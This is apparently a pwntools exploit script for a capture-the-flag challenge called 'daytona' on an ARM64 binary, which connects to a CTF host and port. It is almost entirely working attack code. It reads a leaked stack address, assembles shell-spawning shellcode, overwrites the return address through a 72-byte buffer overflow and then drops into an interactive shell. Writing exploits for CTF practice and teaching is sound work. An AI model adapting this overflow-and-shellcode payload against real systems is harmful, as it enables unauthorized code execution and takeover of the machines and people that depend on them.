#!/usr/bin/env python3

from pwn import *

elf = ELF("./daytona")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
context.arch="arm64"

#context.log_level = "debug"
context.arch = 'aarch64'  # ARM64
context.os = 'linux'

gs = '''
break *printf
set disassembly-flavor intel
'''

domain = "chal.sunshinectf.games"
port = 25606

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

#========= exploit here ===================

# buffer1 leak
leak = int(r.recvline().split(b"MPH")[0].split(b" ")[6])
print(hex(leak))

sc = asm(shellcraft.sh())

# leaked address + sizeof(buffer1) + sizeof(buffer2) + address
target = leak + 109 + 72 + 0x10

r.sendline(b"A"*72 + p64(target) + sc)
r.interactive()

